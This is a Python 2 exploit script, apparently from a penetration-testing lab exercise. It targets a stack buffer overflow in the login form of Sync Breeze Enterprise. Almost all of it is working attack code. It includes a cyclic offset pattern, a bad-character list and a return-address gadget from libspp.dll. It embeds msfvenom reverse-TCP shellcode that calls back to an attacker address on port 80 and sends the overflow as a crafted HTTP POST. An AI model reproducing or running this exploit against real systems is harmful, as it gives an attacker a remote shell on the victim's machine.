#!/usr/bin/python
import socket
import time

def recv_timeout(the_socket,timeout=2):
    #make socket non blocking
    the_socket.setblocking(0)
    
    #total data partwise in an array
    total_data=[];
    data='';
    
    #beginning time
    begin=time.time()
    while 1:
        #if you got some data, then break after timeout
        if total_data and time.time()-begin > timeout:
            break
        
        #if you got no data at all, wait a little longer, twice the timeout
        elif time.time()-begin > timeout*2:
            break
        
        #recv something
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data)
                #change the beginning time for measurement
                begin=time.time()
            else:
                #sleep for sometime to indicate a gap
                time.sleep(0.1)
        except:
            pass
    
    #join all parts to make final string
    return ''.join(total_data)


print("Exploitation ")
#pattern_circular
'''Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5B
'''
#x0a\x0d\x25\x26\x27\x2b\x3d
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x28\x29\x2a\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

#0x1005f916 : push esp # ret 0x08 |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)
esp = '\x16\xf9\x05\x10'

# msfvenom -p windows/shell_reverse_tcp -f py  EXITFUNC=thread LHOST=192.168.119.207 LPORT=80 -b "x0a\x0d\x25\x26\x27\x2b\x3d"
buf =  ""
buf += "\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x04\x93\x84\xeb\x83\xee\xfc\xe2\xf4\xf8\x7b"
buf += "\x06\xeb\x04\x93\xe4\x62\xe1\xa2\x44\x8f\x8f\xc3\xb4"
buf += "\x60\x56\x9f\x0f\xb9\x10\x18\xf6\xc3\x0b\x24\xce\xcd"
buf += "\x35\x6c\x28\xd7\x65\xef\x86\xc7\x24\x52\x4b\xe6\x05"
buf += "\x54\x66\x19\x56\xc4\x0f\xb9\x14\x18\xce\xd7\x8f\xdf"
buf += "\x95\x93\xe7\xdb\x85\x3a\x55\x18\xdd\xcb\x05\x40\x0f"
buf += "\xa2\x1c\x70\xbe\xa2\x8f\xa7\x0f\xea\xd2\xa2\x7b\x47"
buf += "\xc5\x5c\x89\xea\xc3\xab\x64\x9e\xf2\x90\xf9\x13\x3f"
buf += "\xee\xa0\x9e\xe0\xcb\x0f\xb3\x20\x92\x57\x8d\x8f\x9f"
buf += "\xcf\x60\x5c\x8f\x85\x38\x8f\x97\x0f\xea\xd4\x1a\xc0"
buf += "\xcf\x20\xc8\xdf\x8a\x5d\xc9\xd5\x14\xe4\xcc\xdb\xb1"
buf += "\x8f\x81\x6f\x66\x59\xfb\xb7\xd9\x04\x93\xec\x9c\x77"
buf += "\xa1\xdb\xbf\x6c\xdf\xf3\xcd\x03\x6c\x51\x53\x94\x92"
buf += "\x84\xeb\x2d\x57\xd0\xbb\x6c\xba\x04\x80\x04\x6c\x51"
buf += "\xbb\x54\xc3\xd4\xab\x54\xd3\xd4\x83\xee\x9c\x5b\x0b"
buf += "\xfb\x46\x13\x81\x01\xfb\x44\x43\x73\x5c\xec\xe9\x04"
buf += "\x93\xd4\x62\xe2\xf9\x94\xbd\x53\xfb\x1d\x4e\x70\xf2"
buf += "\x7b\x3e\x81\x53\xf0\xe7\xfb\xdd\x8c\x9e\xe8\xfb\x74"
buf += "\x5e\xa6\xc5\x7b\x3e\x6c\xf0\xe9\x8f\x04\x1a\x67\xbc"
buf += "\x53\xc4\xb5\x1d\x6e\x81\xdd\xbd\xe6\x6e\xe2\x2c\x40"
buf += "\xb7\xb8\xea\x05\x1e\xc0\xcf\x14\x55\x84\xaf\x50\xc3"
buf += "\xd2\xbd\x52\xd5\xd2\xa5\x52\xc5\xd7\xbd\x6c\xea\x48"
buf += "\xd4\x82\x6c\x51\x62\xe4\xdd\xd2\xad\xfb\xa3\xec\xe3"
buf += "\x83\x8e\xe4\x14\xd1\x28\x64\xf6\x2e\x99\xec\x4d\x91"
buf += "\x2e\x19\x14\xd1\xaf\x82\x97\x0e\x13\x7f\x0b\x71\x96"
buf += "\x3f\xac\x17\xe1\xeb\x81\x04\xc0\x7b\x3e"
payload = buf


try:
        print "\nSending evil buffer..."
        size = 800
        #inputBuffer = "A" * size
        #inputBuffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5B"
        
        inputBuffer = "A" * 780 + esp + "CCCC" + payload
        #inputBuffer += "D" * (1500 - len(inputBuffer))
        
        print("\n Buffer size : ", len(inputBuffer))
        content = "username=" + inputBuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 192.168.207.10\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101Firefox/52.0\r\n"
        buffer += "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://10.11.0.22/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"
        
        buffer += content
        print(buffer)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.207.10", 80))
        s.sendall(buffer)
        print(recv_timeout(s,2))
        s.close()

        print "\nDone!"
        time.sleep(2)
except Exception as e: 
    print(e)
    print "Could not connect!"
                                   
